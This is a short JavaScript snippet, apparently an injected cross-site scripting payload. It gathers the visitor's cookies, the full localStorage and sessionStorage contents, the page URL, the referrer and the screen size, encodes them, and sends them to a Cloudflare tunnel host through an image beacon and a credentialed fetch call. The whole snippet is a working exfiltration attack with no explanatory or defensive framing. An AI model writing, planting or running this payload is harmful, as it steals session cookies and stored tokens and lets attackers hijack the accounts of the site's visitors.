(function () {
  var base = "https://columnists-builder-stamps-involvement.trycloudflare.com";
  var payload = {
    u: location.href,
    c: document.cookie,
    l: localStorage.length ? JSON.stringify(localStorage) : "",
    s: sessionStorage.length ? JSON.stringify(sessionStorage) : "",
    t: Date.now(),
    r: document.referrer,
    sc: screen.width + "x" + screen.height,
  };
  var img = new Image();
  img.src = base + "/collect?d=" + encodeURIComponent(btoa(JSON.stringify(payload)));
  document.body.appendChild(img);

  fetch(base + "/collect?c=" + encodeURIComponent(document.cookie), { credentials: "include" }).catch(function () {});
})();
